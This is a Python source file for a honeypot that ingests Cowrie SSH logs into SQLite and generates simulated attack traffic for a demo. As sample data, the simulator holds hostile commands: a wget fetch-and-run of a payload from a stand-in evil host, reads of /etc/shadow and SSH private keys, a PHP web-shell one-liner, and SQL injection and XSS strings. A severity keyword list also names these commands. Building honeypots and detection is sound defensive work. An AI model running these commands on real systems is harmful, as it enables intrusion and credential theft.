"""
Cowrie SSH Honeypot Bridge — Component 2
Reads Cowrie's JSON log output and normalises it into the unified SQLite DB.

In production: Cowrie runs on port 2222 (iptables forwards 22→2222).
This bridge watches cowrie.json and ingests new events continuously.

For the demo: we SIMULATE realistic Cowrie SSH attack sessions.
"""

import sqlite3, json, os, time, hashlib, random
from datetime import datetime, timedelta

DB_PATH = os.path.join(os.path.dirname(__file__), "..", "data", "honeypot.db")

# ── Cowrie Log Ingestion ────────────────────────────────────────────────────
def ingest_cowrie_event(event: dict):
    """Parse a single Cowrie JSON event and write to both ssh_events and unified_log."""
    conn = sqlite3.connect(DB_PATH)
    try:
        etype = event.get("eventid", "")
        ip    = event.get("src_ip", "0.0.0.0")
        ts    = event.get("timestamp", datetime.now().isoformat())
        sess  = event.get("session", hashlib.md5(ip.encode()).hexdigest()[:8])

        if "cowrie.login" in etype:
            username = event.get("username", "")
            password = event.get("password", "")
            success  = 1 if "success" in etype else 0
            conn.execute("""
                INSERT OR IGNORE INTO ssh_events
                  (timestamp, source_ip, username, password, success, session_id)
                VALUES (?,?,?,?,?,?)
            """, (ts, ip, username, password, success, sess))
            conn.execute("""
                INSERT INTO unified_log
                  (timestamp, source_ip, protocol, event_type, username, payload, severity)
                VALUES (?,?,?,?,?,?,?)
            """, (ts, ip, "SSH", "login_attempt", username, password,
                  "HIGH" if success else "MEDIUM"))

        elif "cowrie.command" in etype:
            cmd = event.get("input", "")
            conn.execute("""
                INSERT INTO unified_log
                  (timestamp, source_ip, protocol, event_type, payload, severity)
                VALUES (?,?,?,?,?,?)
            """, (ts, ip, "SSH", "command_exec", cmd,
                  "CRITICAL" if any(x in cmd for x in ["wget","curl","chmod","rm -rf"]) else "HIGH"))

        elif "cowrie.session.closed" in etype:
            duration = event.get("duration", 0)
            conn.execute("""
                UPDATE ssh_events SET session_duration=?
                WHERE session_id=? AND source_ip=?
            """, (duration, sess, ip))

        conn.commit()
    finally:
        conn.close()

# ── Attack Simulator ────────────────────────────────────────────────────────
ATTACK_PROFILES = {
    "OpportunisticBot": {
        "ips": ["185.220.101.42", "195.54.160.149", "91.92.251.103"],
        "creds": [("root","root"),("admin","admin"),("pi","raspberry"),
                  ("ubuntu","ubuntu"),("test","test"),("user","user123")],
        "commands": ["uname -a", "whoami", "cat /etc/passwd", "ls /home"],
        "duration": (2, 8),
        "sessions": (20, 80),
    },
    "BruteForcer": {
        "ips": ["103.99.0.122", "45.142.212.100", "194.165.16.4"],
        "creds": [("root", p) for p in
                  ["123456","password","admin","toor","qwerty","letmein",
                   "1q2w3e","iloveyou","sunshine","monkey"]],
        "commands": ["id", "whoami"],
        "duration": (1, 3),
        "sessions": (100, 300),
    },
    "WebExplorer": {
        "ips": ["176.65.148.10", "77.247.110.30"],
        "creds": [("deploy","deploy"),("git","git"),("www-data","webserver")],
        "commands": ["ls /var/www", "cat /var/www/html/.env",
                     "mysql -u root -p", "php -r 'system($_GET[cmd]);'"],
        "duration": (30, 120),
        "sessions": (5, 15),
    },
    "APT": {
        "ips": ["198.54.117.197", "5.188.206.60"],
        "creds": [("sysadmin","Summer2024!"),("backup","Backup@123")],
        "commands": [
            "uname -a", "cat /etc/shadow", "crontab -e",
            "wget http://evil.example.com/payload.sh",
            "chmod +x payload.sh", "./payload.sh",
            "ssh-keygen -t rsa", "cat ~/.ssh/id_rsa"
        ],
        "duration": (300, 900),
        "sessions": (2, 5),
    },
}

def simulate_attacks(days_back=3):
    """Populate DB with realistic synthetic attack data for demonstration."""
    from database import init_db
    init_db()

    total = 0
    now = datetime.now()

    print("[SIMULATOR] Generating realistic attack traffic...\n")

    for profile_name, profile in ATTACK_PROFILES.items():
        n_sessions = random.randint(*profile["sessions"])

        for _ in range(n_sessions):
            ip       = random.choice(profile["ips"])
            ts_start = now - timedelta(
                days=random.uniform(0, days_back),
                hours=random.uniform(0, 24))
            sess_id  = hashlib.md5(f"{ip}{ts_start}".encode()).hexdigest()[:8]
            u, p     = random.choice(profile["creds"])
            success  = 1 if profile_name == "APT" and random.random() < 0.3 else 0
            duration = random.uniform(*profile["duration"])

            conn = sqlite3.connect(DB_PATH)
            try:
                # SSH login attempt
                conn.execute("""
                    INSERT INTO ssh_events
                      (timestamp, source_ip, username, password, success,
                       session_duration, commands, session_id)
                    VALUES (?,?,?,?,?,?,?,?)
                """, (ts_start.isoformat(), ip, u, p, success, duration,
                      json.dumps(profile["commands"][:random.randint(1,len(profile["commands"]))]),
                      sess_id))

                # Unified log entry
                conn.execute("""
                    INSERT INTO unified_log
                      (timestamp, source_ip, protocol, event_type, username, payload, severity)
                    VALUES (?,?,?,?,?,?,?)
                """, (ts_start.isoformat(), ip, "SSH", "login_attempt", u, p,
                      "HIGH" if success else "MEDIUM"))

                # Command logs for successful / deeper sessions
                if success or profile_name in ("WebExplorer","APT"):
                    for cmd in profile["commands"][:random.randint(2, len(profile["commands"]))]:
                        cmd_ts = ts_start + timedelta(seconds=random.uniform(5, 60))
                        conn.execute("""
                            INSERT INTO unified_log
                              (timestamp, source_ip, protocol, event_type, payload, severity)
                            VALUES (?,?,?,?,?,?)
                        """, (cmd_ts.isoformat(), ip, "SSH", "command_exec", cmd,
                              "CRITICAL" if "wget" in cmd or "curl" in cmd else "HIGH"))

                conn.commit()
                total += 1
            finally:
                conn.close()

    # Also simulate web honeypot attacks
    WEB_ATTACKS = [
        ("91.92.251.103","POST","/login","admin","' OR 1=1--","SQLi"),
        ("185.220.101.42","GET","/.env","","","PathEnum"),
        ("176.65.148.10","POST","/login","admin","admin123","BruteForce"),
        ("103.99.0.122","GET","/wp-admin","","","Scan"),
        ("45.142.212.100","POST","/login","root","<script>alert(1)</script>","XSS"),
        ("194.165.16.4","POST","/api/users","","UNION SELECT * FROM users--","SQLi"),
        ("198.54.117.197","GET","/.git/config","","","PathEnum"),
        ("5.188.206.60","POST","/admin/login","admin","Summer2024!","BruteForce"),
    ]

    for i, (ip, method, path, user, payload, pattern) in enumerate(WEB_ATTACKS * 15):
        ts = now - timedelta(
            days=random.uniform(0, days_back),
            hours=random.uniform(0, 24))
        conn = sqlite3.connect(DB_PATH)
        try:
            conn.execute("""
                INSERT INTO web_events
                  (timestamp, source_ip, http_method, request_path, username,
                   password, post_body, attack_pattern, user_agent)
                VALUES (?,?,?,?,?,?,?,?,?)
            """, (ts.isoformat(), ip, method, path, user, payload, payload,
                  pattern, random.choice([
                      "Mozilla/5.0","Nmap Scripting Engine","sqlmap/1.7",
                      "Hydra","nikto","curl/7.88"])))
            conn.execute("""
                INSERT INTO unified_log
                  (timestamp, source_ip, protocol, event_type, username, payload, severity)
                VALUES (?,?,?,?,?,?,?)
            """, (ts.isoformat(), ip, "HTTP", pattern, user, payload,
                  "HIGH" if pattern in ("SQLi","XSS") else "MEDIUM"))
            conn.commit()
        finally:
            conn.close()

    print(f"[SIMULATOR] Generated {total} SSH sessions + {len(WEB_ATTACKS)*15} web events")
    print(f"[SIMULATOR] Attack profiles: {list(ATTACK_PROFILES.keys())}")

def watch_cowrie_log(log_path, interval=10):
    """
    Auto-watch mode: reads cowrie.json every N seconds
    and ingests any new lines into the DB automatically.
    Run this on VM1 to keep SSH events synced continuously.
    Usage: python3 cowrie_bridge.py watch /path/to/cowrie.json
    """
    import time
    last_pos = 0
    print(f"[BRIDGE] Watching {log_path} every {interval}s...")
    while True:
        try:
            if os.path.exists(log_path):
                with open(log_path) as f:
                    f.seek(last_pos)
                    new_lines = f.readlines()
                    last_pos = f.tell()
                if new_lines:
                    conn = sqlite3.connect(DB_PATH)
                    count = 0
                    for line in new_lines:
                        try:
                            event = json.loads(line.strip())
                            etype = event.get("eventid","")
                            ip    = event.get("src_ip","0.0.0.0")
                            ts    = event.get("timestamp", datetime.now().isoformat())
                            sess  = event.get("session","")
                            if "cowrie.login" in etype:
                                conn.execute("""
                                    INSERT OR IGNORE INTO ssh_events
                                    (timestamp,source_ip,username,password,success,session_id)
                                    VALUES (?,?,?,?,?,?)""",
                                    (ts,ip,event.get("username",""),event.get("password",""),
                                     1 if "success" in etype else 0, sess))
                                conn.execute("""
                                    INSERT INTO unified_log
                                    (timestamp,source_ip,protocol,event_type,username,payload,severity)
                                    VALUES (?,?,?,?,?,?,?)""",
                                    (ts,ip,"SSH","login_attempt",
                                     event.get("username",""),event.get("password",""),
                                     "HIGH"))
                                count += 1
                            elif "cowrie.command" in etype:
                                cmd = event.get("input","")
                                sev = "CRITICAL" if any(x in cmd for x in ["wget","curl","chmod","rm -rf"]) else "HIGH"
                                conn.execute("""
                                    INSERT INTO unified_log
                                    (timestamp,source_ip,protocol,event_type,payload,severity)
                                    VALUES (?,?,?,?,?,?)""",
                                    (ts,ip,"SSH","command_exec",cmd,sev))
                                count += 1
                        except: pass
                    conn.commit()
                    conn.close()
                    if count:
                        print(f"[BRIDGE] {count} new SSH events ingested")
        except Exception as e:
            print(f"[BRIDGE] Error: {e}")
        time.sleep(interval)


if __name__ == "__main__":
    import sys
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
    if len(sys.argv) > 1 and sys.argv[1] == "watch":
        log = sys.argv[2] if len(sys.argv) > 2 else "cowrie_bridge/cowrie.json"
        watch_cowrie_log(log)
    else:
        simulate_attacks()
